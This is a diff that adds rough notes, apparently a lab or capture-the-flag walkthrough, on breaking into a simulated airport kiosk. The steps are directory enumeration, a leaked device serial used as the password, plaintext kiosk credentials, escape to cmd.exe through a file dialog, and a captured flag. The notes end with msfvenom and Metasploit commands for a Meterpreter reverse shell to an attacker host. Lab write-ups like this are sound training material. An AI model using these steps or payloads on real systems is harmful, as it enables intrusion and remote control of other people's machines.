@@ -1,0 +1,81 @@
+init acces
+http://10.129.11.184:8443
+
+with force redirect to /login
+
+in this page i need device password
+
+
+Web enumeration
+feroxbuster -u http://10.129.11.184:8443/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,php,aspx
+
+
+this enumeration display
+302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        1l        2w       35c http://10.129.11.184:8443/api
+200      GET        1l        3w      116c http://10.129.11.184:8443/api/status
+405      GET        1l        3w       30c http://10.129.11.184:8443/api/scan
+
+the valid and not require auth is /api/status
+
+this endpoint disply this information:
+{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":54853}
+
+
+hit: serial is password 
+
+n_n good, I come in to dashboard
+
+
+exploring
+
+Passport Scanner — Nexion DocReader SR-4200
+Serial	NX-SR-2024-0042
+Firmware	4.2.1
+Connection	USB 3.0
+Status	online
+Username	KioskUser
+Password	K!0sk2026#
+
+Boarding Pass Printer — Nexion TP-820
+Serial	NX-TP-2024-0042
+Firmware	2.8.3
+Connection	USB 2.0
+Status	online
+Username	KioskUser
+Password	K!0sk2026#
+
+
+this credentials
+
+RDP -> Remote desktop protocol
+3389/tcp open  ms-wbt-server
+
+
+nice, power off in scanner on web 
+
+turn off badge  scanner generate a error on RDP client, this error exposes an embedded browser (Edge/IE) or a file dialog that can be turned into a real desktop shell. 
+
+press: ctrl + o -> this display file explorer
+
+find cmd.exe -> this file is located on `C:\Windows\System32` folder, press and download and execute.
+
+in desktop is user.txt
+
+user flag -> f149f63bbc26a07d9c6eba3b9b44e898
+
+
+
+access
+
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.15.108
+set LPORT 9001
+run
+
+
+pyload generator
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.108 LPORT=9001 -f exe -o meterpreter.exe
